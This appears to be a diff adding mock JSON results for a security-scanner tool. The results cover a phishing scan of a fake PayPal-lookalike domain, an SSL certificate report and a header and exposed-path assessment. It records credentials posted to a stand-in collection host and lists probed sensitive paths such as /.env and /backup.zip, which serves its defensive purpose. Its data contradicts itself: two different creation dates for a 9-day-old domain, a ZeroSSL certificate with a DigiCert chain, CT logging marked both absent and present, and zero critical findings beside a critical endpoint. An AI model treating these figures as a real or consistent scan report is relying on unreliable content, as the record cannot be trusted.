+   "Unregistered merchant",
+   "Fixed amount QR",
+   "Recent scam reports",
+   "Individual account for business collection"
+  ],
+  "tool": "upi-qr"
+ },
+ "scan": {
+  "scanId": "TS-XZLNM4",
+  "url": "https://paypal-secure-login.example/session/verify",
+  "domain": "paypal-secure-login.example",
+  "scannedAt": "2026-11-08T12:39:10.142Z",
+  "riskScore": 94,
+  "verdict": "malicious",
+  "verdictMeta": {
+   "label": "Malicious",
+   "tone": "critical",
+   "description": "Multiple high-confidence threat signals"
+  },
+  "confidence": 96,
+  "summary": "High-confidence credential phishing. The page clones a payment provider login form, posts credentials to a third-party endpoint, and was registered 9 days ago behind a privacy proxy on a bulletproof host.",
+  "indicators": [
+   {
+    "id": "brand-clone",
+    "severity": "critical",
+    "label": "Payment brand cloned",
+    "detail": "Logo, palette and login form closely match a payment provider while the domain is unrelated to it.",
+    "evidence": "Visual similarity 96% · favicon hash match"
+   },
+   {
+    "id": "cred-post",
+    "severity": "critical",
+    "label": "Credentials posted off-domain",
+    "detail": "The login form submits to a host outside the visible domain with no CSRF protection.",
+    "evidence": "POST https://collect.example-cdn.example/api/v2/login"
+   },
+   {
+    "id": "new-domain",
+    "severity": "high",
+    "label": "Domain registered 9 days ago",
+    "detail": "Threat actors rotate infrastructure rapidly; new registrations next to a brand keyword are a strong signal.",
+    "evidence": "Created 2026-10-30 · privacy shielded"
+   },
+   {
+    "id": "keyword-domain",
+    "severity": "high",
+    "label": "Brand + lure keywords in hostname",
+    "detail": "The hostname combines a brand with “secure” and “login”, a classic impersonation pattern.",
+    "evidence": "paypal-secure-login.example"
+   },
+   {
+    "id": "no-mx",
+    "severity": "medium",
+    "label": "No mail records on a \"bank\" domain",
+    "detail": "A legitimate payment provider would publish SPF, DMARC and MX records.",
+    "evidence": "MX: none · SPF: none · DMARC: none"
+   },
+   {
+    "id": "obfuscated-js",
+    "severity": "high",
+    "label": "Obfuscated anti-analysis script",
+    "detail": "A packed script disables right-click and devtools and blocks paste into the password field.",
+    "evidence": "eval(function(p,a,c,k,e,d) … 14.2 KB"
+   }
+  ],
+  "positiveSignals": [
+   "TLS 1.2 is enabled (certificate is domain-validated only)"
+  ],
+  "categories": {
+   "phishing": 96,
+   "malware": 32,
+   "impersonation": 94,
+   "infrastructure": 72,
+   "behaviour": 88
+  },
+  "domainInfo": {
+   "registrar": "NameCheap, Inc.",
+   "ageDays": 9,
+   "created": "2026-10-02T12:39:10.142Z",
+   "ip": "203.0.113.87",
+   "country": "Russia",
+   "countryCode": "RU",
+   "asn": "AS210644",
+   "org": "AEZA International Ltd.",
+   "nameservers": [
+    "ns1.dns-parking.com",
+    "ns2.dns-parking.com"
+   ],
+   "privacy": true
+  },
+  "ssl": {
+   "valid": true,
+   "issuer": "ZeroSSL",
+   "protocol": "TLS 1.2",
+   "grade": "C",
+   "daysRemaining": 81,
+   "subject": "paypal-secure-login.example",
+   "issuerMeta": {
+    "name": "ZeroSSL",
+    "tier": "DV",
+    "trust": 60
+   },
+   "ctLogged": false,
+   "keyType": "RSA",
+   "validFrom": "2026-09-26T12:39:10.142Z",
+   "validTo": "2027-01-28T12:39:10.142Z",
+   "sans": [
+    "paypal-secure-login.example",
+    "www.paypal-secure-login.example"
+   ]
+  },
+  "redirects": [
+   {
+    "step": 1,
+    "from": "https://paypal-secure-login.example/session/verify",
+    "to": "https://track.example-cdn.example/r/8f2a",
+    "status": 302,
+    "type": "HTTP",
+    "note": "Tracking gateway"
+   },
+   {
+    "step": 2,
+    "from": "https://track.example-cdn.example/r/8f2a",
+    "to": "https://paypal-secure-login.example/auth/login.html",
+    "status": 302,
+    "type": "HTTP",
+    "note": "Lure page"
+   }
+  ],
+  "intel": [
+   {
+    "source": "Global Blocklist Exchange",
+    "status": "malicious",
+    "confidence": 98,
+    "lastSeen": "2026-11-08T12:39:10.138Z"
+   },
+   {
+    "source": "PhishWatch Community Feed",
+    "status": "malicious",
+    "confidence": 94,
+    "lastSeen": "2026-11-07T12:39:10.138Z"
+   },
+   {
+    "source": "Certificate Watch Graph",
+    "status": "suspicious",
+    "confidence": 72,
+    "lastSeen": "2026-11-06T12:39:10.138Z"
+   },
+   {
+    "source": "Domain Reputation Mesh",
+    "status": "malicious",
+    "confidence": 91,
+    "lastSeen": "2026-11-08T12:39:10.138Z"
+   },
+   {
+    "source": "Malware URL Corpus",
+    "status": "unrated",
+    "confidence": 0,
+    "lastSeen": null
+   }
+  ],
+  "timeline": [
+   {
+    "stage": "DNS resolution",
+    "status": "complete",
+    "ms": 35,
+    "detail": "paypal-secure-login.example → 203.0.113.87"
+   },
+   {
+    "stage": "TLS handshake",
+    "status": "complete",
+    "ms": 170,
+    "detail": "TLS 1.2 · ZeroSSL"
+   },
+   {
+    "stage": "Certificate transparency",
+    "status": "complete",
+    "ms": 238,
+    "detail": "No SCTs embedded"
+   },
+   {
+    "stage": "Content render",
+    "status": "complete",
+    "ms": 456,
+    "detail": "38 requests · 8 third-party"
+   },
+   {
+    "stage": "Behaviour sandbox",
+    "status": "complete",
+    "ms": 793,
+    "detail": "14 scripts executed"
+   },
+   {
+    "stage": "Reputation correlation",
+    "status": "complete",
+    "ms": 98,
+    "detail": "4 of 5 sources returned signals"
+   }
+  ],
+  "recommendations": [
+   "Do not enter credentials, payment details or one-time passwords on this page",
+   "Block the domain at DNS, proxy or email gateway level",
+   "Report the URL to your regional CERT and the impersonated brand",
+   "If credentials were entered, rotate them now and revoke active sessions"
+  ],
+  "relationship": {
+   "relatedDomains": 5,
+   "sharedCertificates": 5,
+   "campaignLinked": true
+  }
+ },
+ "ssl": {
+  "domain": "paypal-secure-login.example",
+  "checkedAt": "2026-11-08T12:39:10.142Z",
+  "score": 62,
+  "grade": "C",
+  "health": "at-risk",
+  "subject": {
+   "commonName": "paypal-secure-login.example",
+   "organisation": "Cloudflare, Inc.",
+   "organisationalUnit": "Security",
+   "locality": "Amsterdam",
+   "country": "SG",
+   "sans": [
+    "paypal-secure-login.example",
+    "www.paypal-secure-login.example",
+    "api.paypal-secure-login.example"
+   ]
+  },
+  "issuer": {
+   "name": "ZeroSSL",
+   "commonName": "DigiCert TLS RSA SHA256 2020 CA1",
+   "organisation": "ZeroSSL",
+   "tier": "OV",
+   "trust": 96,
+   "country": "US"
+  },
+  "validity": {
+   "notBefore": "2026-07-17T12:39:10.142Z",
+   "notAfter": "2026-11-26T12:39:10.142Z",
+   "daysRemaining": 18,
+   "lifetimeDays": 97,
+   "status": "expiring"
+  },
+  "protocol": "TLS 1.2",
+  "cipher": "TLS_AES_256_GCM_SHA384",
+  "key": {
+   "algorithm": "RSA",
+   "size": 2048,
+   "curve": null,
+   "strength": "strong"
+  },
+  "signature": "sha256WithRSAEncryption",
+  "chain": [
+   {
+    "level": "Leaf",
+    "name": "paypal-secure-login.example",
+    "issuer": "ZeroSSL",
+    "validTo": "2026-11-26T12:39:10.142Z",
+    "status": "valid",
+    "algorithm": "SHA-256"
+   },
+   {
+    "level": "Intermediate",
+    "name": "DigiCert TLS RSA SHA256 2020 CA1",
+    "issuer": "DigiCert Global Root G2",
+    "validTo": "2028-10-29T12:39:10.142Z",
+    "status": "valid",
+    "algorithm": "SHA-384"
+   },
+   {
+    "level": "Root",
+    "name": "DigiCert Global Root G2",
+    "issuer": "DigiCert Global Root G2",
+    "validTo": "2037-10-05T12:39:10.142Z",
+    "status": "trusted",
+    "algorithm": "SHA-384"
+   }
+  ],
+  "ct": {
+   "logged": true,
+   "sctCount": 4,
+   "logs": [
+    {
+     "name": "Cloudflare Nimbus 2026",
+     "operator": "Cloudflare",
+     "loggedAt": "2026-10-26T12:39:10.142Z",
+     "status": "included"
+    },
+    {
+     "name": "Google Argon 2026",
+     "operator": "Google",
+     "loggedAt": "2026-10-17T12:39:10.142Z",
+     "status": "included"
+    },
+    {
+     "name": "Sectigo Sabre 2026",
+     "operator": "Sectigo",
+     "loggedAt": "2026-10-18T12:39:10.142Z",
+     "status": "included"
+    }
+   ],
+   "lookalikes": 6
+  },
+  "revocation": {
+   "method": "OCSP + CRL",
+   "status": "good",
+   "ocspResponder": "ocsp.digicertinc.example",
+   "checkedAt": "2026-11-08T12:39:10.142Z",
+   "mustStaple": false
+  },
+  "findings": [
+   {
+    "severity": "high",
+    "label": "Certificate expires soon",
+    "detail": "Only 18 days remain. Renewal automation may be broken."
+   },
+   {
+    "severity": "info",
+    "label": "RSA 2048-bit key",
+    "detail": "Acceptable today; 3072-bit or ECDSA P-256 is preferred for long-lived certificates."
+   },
+   {
+    "severity": "low",
+    "label": "CT logging verified",
+    "detail": "4 signed certificate timestamps found in public logs."
+   },
+   {
+    "severity": "critical",
+    "label": "Weak transport configuration",
+    "detail": "Legacy TLS settings and a domain-validated certificate on a financial brand are a high-risk combination."
+   },
+   {
+    "severity": "info",
+    "label": "Chain order correct",
+    "detail": "Leaf → intermediate → root resolves to a trusted public root store."
+   }
+  ]
+ },
+ "assessment": {
+  "domain": "paypal-secure-login.example",
+  "assessedAt": "2026-11-08T12:39:10.142Z",
+  "score": 20,
+  "grade": "F",
+  "headers": [
+   {
+    "name": "Strict-Transport-Security",
+    "weight": 18,
+    "good": "max-age=63072000; includeSubDomains; preload",
+    "risk": "Protocol downgrade and cookie hijacking become possible.",
+    "present": false,
+    "value": null,
+    "retained": 0
+   },
+   {
+    "name": "Content-Security-Policy",
+    "weight": 20,
+    "good": "default-src 'self'; script-src 'self' 'nonce-…'",
+    "risk": "Injected scripts can execute with full page privileges.",
+    "present": true,
+    "value": "default-src 'self'; script-src 'self' 'nonce-…'",
+    "retained": 17
+   },
+   {
+    "name": "X-Content-Type-Options",
+    "weight": 8,
+    "good": "nosniff",
+    "risk": "Browsers may MIME-sniff responses into executable types.",
+    "present": false,
+    "value": null,
+    "retained": 0
+   },
+   {
+    "name": "X-Frame-Options",
+    "weight": 10,
+    "good": "DENY",
+    "risk": "The site can be framed for clickjacking attacks.",
+    "present": false,
+    "value": null,
+    "retained": 0
+   },
+   {
+    "name": "Referrer-Policy",
+    "weight": 8,
+    "good": "strict-origin-when-cross-origin",
+    "risk": "Full URLs leak to third parties through the Referer header.",
+    "present": false,
+    "value": null,
+    "retained": 0
+   },
+   {
+    "name": "Permissions-Policy",
+    "weight": 10,
+    "good": "camera=(), microphone=(), geolocation=()",
+    "risk": "Powerful browser features remain available to embedded content.",
+    "present": false,
+    "value": null,
+    "retained": 0
+   },
+   {
+    "name": "Cross-Origin-Opener-Policy",
+    "weight": 8,
+    "good": "same-origin",
+    "risk": "Cross-window references enable side-channel attacks.",
+    "present": true,
+    "value": "same-origin",
+    "retained": 7
+   }
+  ],
+  "headerScore": 29,
+  "https": {
+   "enforced": true,
+   "hstsPreload": false,
+   "redirectsHttp": true,
+   "mixedContent": 2
+  },
+  "tls": {
+   "versions": [
+    "TLS 1.3",
+    "TLS 1.2",
+    "TLS 1.1",
+    "TLS 1.0"
+   ],
+   "preferred": "TLS 1.2",
+   "cipher": "ECDHE-RSA-AES128-SHA",
+   "forwardSecrecy": false,
+   "ocspStapling": false
+  },
+  "endpoints": [
+   {
+    "path": "/admin/login",
+    "status": 200,
+    "label": "Admin panel",
+    "severity": "high"
+   },
+   {
+    "path": "/.env",
+    "status": 404,
+    "label": "Environment file",
+    "severity": "info"
+   },
+   {
+    "path": "/api/v1/users",
+    "status": 200,
+    "label": "User API",
+    "severity": "critical"
+   },
+   {
+    "path": "/server-status",
+    "status": 200,
+    "label": "Server status",
+    "severity": "medium"
+   },
+   {
+    "path": "/backup.zip",
+    "status": 404,
+    "label": "Backup archive",
+    "severity": "info"
+   }
+  ],
+  "findings": [
+   {
+    "id": "hdr-Strict-Transport-Security",
+    "severity": "high",
+    "title": "Missing Strict-Transport-Security",
+    "area": "Security headers",
+    "description": "The response does not include the Strict-Transport-Security header, so browsers cannot enforce this protection.",
+    "impact": "Protocol downgrade and cookie hijacking become possible.",
+    "evidence": "GET https://paypal-secure-login.example/ → header absent",
+    "recommendation": "Set Strict-Transport-Security: max-age=63072000; includeSubDomains; preload"
+   },
+   {
+    "id": "panel",
+    "severity": "high",
+    "title": "Administrative panel reachable publicly",
+    "area": "Exposure",
+    "description": "A login panel responds with HTTP 200 on a predictable path without network restriction.",
+    "impact": "Credential stuffing and brute-force attempts can target the panel directly.",
+    "evidence": "https://paypal-secure-login.example/admin/login → 200 OK",
+    "recommendation": "Restrict by IP allowlist or SSO, add rate limiting and MFA."
+   },
+   {
+    "id": "hdr-X-Frame-Options",
+    "severity": "medium",
+    "title": "Missing X-Frame-Options",
+    "area": "Security headers",
+    "description": "The response does not include the X-Frame-Options header, so browsers cannot enforce this protection.",
+    "impact": "The site can be framed for clickjacking attacks.",
+    "evidence": "GET https://paypal-secure-login.example/ → header absent",
+    "recommendation": "Set X-Frame-Options: DENY"
+   },
+   {
+    "id": "hdr-Permissions-Policy",
+    "severity": "medium",
+    "title": "Missing Permissions-Policy",
+    "area": "Security headers",
+    "description": "The response does not include the Permissions-Policy header, so browsers cannot enforce this protection.",
+    "impact": "Powerful browser features remain available to embedded content.",
+    "evidence": "GET https://paypal-secure-login.example/ → header absent",
+    "recommendation": "Set Permissions-Policy: camera=(), microphone=(), geolocation=()"
+   },
+   {
+    "id": "tls-version",
+    "severity": "medium",
+    "title": "Legacy TLS versions negotiable",
+    "area": "Transport",
+    "description": "The endpoint still accepts TLS 1.0 and 1.1 handshakes alongside modern suites.",
+    "impact": "Older clients can be forced into weaker ciphers with known weaknesses.",
+    "evidence": "TLS 1.0 accepted · CBC cipher suites offered",
+    "recommendation": "Disable TLS 1.0/1.1 and prefer AEAD cipher suites only."
+   },
+   {
+    "id": "software",
+    "severity": "medium",
+    "title": "Outdated JavaScript library detected",
+    "area": "Software",
+    "description": "A bundled library version is two minor releases behind the current patch level.",
+    "impact": "Known prototype-pollution issues may be exploitable through user input.",
+    "evidence": "jquery 3.4.1 · latest 3.7.1",
+    "recommendation": "Upgrade to the latest patched release and pin dependencies in CI."
+   },
+   {
+    "id": "cookies",
+    "severity": "medium",
+    "title": "Session cookies require hardening",
+    "area": "Session",
+    "description": "Session cookies are missing one or more of Secure, HttpOnly or SameSite attributes.",
+    "impact": "Session tokens become reachable from JavaScript or cross-site requests.",
+    "evidence": "Set-Cookie: session=…; Path=/",
+    "recommendation": "Issue cookies with Secure; HttpOnly; SameSite=Lax."
+   },
+   {
+    "id": "hdr-X-Content-Type-Options",
+    "severity": "low",
+    "title": "Missing X-Content-Type-Options",
+    "area": "Security headers",
+    "description": "The response does not include the X-Content-Type-Options header, so browsers cannot enforce this protection.",
+    "impact": "Browsers may MIME-sniff responses into executable types.",
+    "evidence": "GET https://paypal-secure-login.example/ → header absent",
+    "recommendation": "Set X-Content-Type-Options: nosniff"
+   },
+   {
+    "id": "hdr-Referrer-Policy",
+    "severity": "low",
+    "title": "Missing Referrer-Policy",
+    "area": "Security headers",
+    "description": "The response does not include the Referrer-Policy header, so browsers cannot enforce this protection.",
+    "impact": "Full URLs leak to third parties through the Referer header.",
+    "evidence": "GET https://paypal-secure-login.example/ → header absent",
+    "recommendation": "Set Referrer-Policy: strict-origin-when-cross-origin"
+   }
+  ],
+  "counts": {
+   "critical": 0,
+   "high": 2,
+   "medium": 5,
+   "low": 2,
+   "info": 0
+  },
+  "recommendations": [
+   "Deploy a nonce-based Content-Security-Policy and report violations to a collector",
+   "Enforce HSTS with preload and a minimum one-year max-age",
+   "Remove public exposure of administrative paths",
+   "Pin and patch third-party JavaScript dependencies",
+   "Add MFA and rate limiting to every authentication surface"
+  ],
+  "latencyMs": 1761
+ }
+}
